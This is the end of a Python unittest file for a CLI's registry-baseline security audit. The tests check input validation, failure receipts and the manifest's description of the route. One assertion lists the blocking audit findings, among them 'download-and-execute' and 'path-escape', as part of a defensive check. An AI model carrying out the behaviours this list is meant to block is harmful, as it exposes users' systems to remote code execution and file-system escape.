        self.assertEqual(row["error_code"], "input_invalid")
        self.assertFalse((directory / "inside" / "baseline.json").exists(), "no report written into the tree")
        self.assertEqual(json.loads(Path(row["receipt"]).read_text(encoding="utf-8"))["status"], "failed")
        code, row = invoke(["registry", "list"])
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["registries"], [])

    def test_manifest_registers_the_route_honestly(self):
        code, row = invoke(["manifest"])
        by_id = {r["id"]: r for r in row["result"]["routes"]}
        route = by_id["registry.baseline"]
        self.assertEqual(route["effect"], "writes-output")
        self.assertIn(route["status"], ("implemented", "available"))
        self.assertIn("security audit", route["notes"])
        support = (ROOT / "docs/SUPPORT.md").read_text(encoding="utf-8")
        if route["status"] == "available":
            self.assertRegex(support, r"`registry baseline`[^\n]*receipts/[^\n]*tier1-offline\.json", "available needs a native receipt linked in SUPPORT.md")
        self.assertEqual(sorted(baseline.BLOCKING), ["download-and-execute", "native-plugin", "path-escape"])
        self.assertTrue(set(baseline.BLOCKING) <= set(baseline.FINDINGS))
        self.assertFalse(set(baseline.FINDINGS) & set(baseline.CAPABILITIES))


if __name__ == "__main__":
    unittest.main()
